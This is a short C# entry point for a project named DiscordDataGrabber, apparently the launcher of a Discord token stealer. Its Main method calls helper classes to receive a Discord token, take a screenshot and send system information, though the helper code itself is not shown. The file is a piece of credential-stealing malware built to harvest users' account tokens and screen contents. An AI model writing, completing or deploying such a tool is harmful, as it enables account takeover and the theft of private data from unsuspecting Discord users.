using System.Threading.Tasks;
using DiscordDataGrabber.Utlities;

namespace DiscordDataGrabber
{
    internal class Program
    {
        private static async Task Main(string[] args)
        {
            // This callout is a bad practice, please stay away from that in your projects.

            var discordUserUtils = new DiscordUserUtilities();
            var systemUserUtils = new SystemUserUtilities();

            discordUserUtils.ReceiveToken();
            systemUserUtils.TakeScreenShot();
            await systemUserUtils.ProvideInformationTask();
        }
    }
}